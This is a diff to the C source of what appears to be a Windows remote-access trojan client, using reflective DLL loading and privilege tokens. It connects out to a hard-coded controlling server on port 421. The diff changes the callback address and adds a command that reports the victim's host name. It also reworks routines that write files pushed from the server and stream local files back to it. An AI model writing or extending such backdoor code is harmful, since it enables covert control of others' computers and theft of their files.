@@ -9,7 +9,7 @@ Modified: -
 #include "LoadLibraryR.h"
 
 int fsize = 0;
-char* fileinfo[3]; 
+char* fileinfo[3];
 char temp[BUFFER]; // Temporary buffer to receive file information
 
 TOKEN_PRIVILEGES priv = { 0 };
@@ -87,7 +87,7 @@ void fhdawn_main(void)
             int expected = 0; // expected bytes of size
             DWORD dwBytesWritten = 0; // number of bytes written
             BOOL write; // Return value of WriteFile();
-
+            
             memset(temp, '\0', BUFFER); // Clear temp
             memset(fileinfo, '\0', 2);
             int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
@@ -127,7 +127,8 @@ void fhdawn_main(void)
                     sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                 }
                 else {
-                    sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    // sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
                 }
                 CloseHandle(recvfile);
             }
@@ -209,34 +210,58 @@ void fhdawn_main(void)
             split(recvbuf, fileinfo, ":");
             
             int bytes_read;
+            BOOL upload = TRUE;
             FILE* fs;
-            // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
-            // IF you'd like to update this, fork and make a pull request, I will happily accept
-            if ((fs = fopen(fileinfo[1], "rb")) != NULL)
-            {
-                fseek(fs, 0L, SEEK_END);
-                long filesize = ftell(fs);
-                fseek(fs, 0, SEEK_SET);
+           
+            do {
 
-                sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
-                Sleep(1000);
-                char fbuffer[500];
-                memset(fbuffer, '\0', 500);
-                while (!feof(fs)) {
-                    if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
-                        send(sockfd, fbuffer, bytes_read, 0);
-                    }
-                    else {
+                for (int i = 0; i < 2; i++) {
+                    if (fileinfo[i] == '\0')
+                    {
+                        sockprintf(sockfd, "[ Invalid File Download Request ]\n");
+                        upload = FALSE;
                         break;
                     }
                 }
-                fclose(fs);
-            }
 
-            else {
-                sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
-            }
+                // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
+                // IF you'd like to update this, fork and make a pull request, I will happily accept
+                if (upload) {
+                    if ((fs = fopen(fileinfo[1], "rb")) != NULL)
+                    {
+                        fseek(fs, 0L, SEEK_END);
+                        long filesize = ftell(fs);
+                        fseek(fs, 0, SEEK_SET);
+
+                        sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
+                        Sleep(1000);
+                        char fbuffer[500];
+                        memset(fbuffer, '\0', 500);
+                        while (!feof(fs)) {
+                            if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
+                                send(sockfd, fbuffer, bytes_read, 0);
+                            }
+                            else {
+                                upload = FALSE;
+                                break;
+                            }
+                        }
+                        fclose(fs);
+                    }
+
+                    else {
+                        sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
+                    }
+                }
+                // important
+                upload = FALSE;
+
+            } while (upload);
             
+        }
+        else if (strcmp(recvbuf, "fhdawn_host") == 0)
+        {
+            sockprintf(sockfd, "%s", UserPC());
         }
 
         else {
@@ -275,7 +300,7 @@ void MainConnect(void)
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("192.168.0.104");
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_port = htons(421);
     server.sin_family = AF_INET;
 
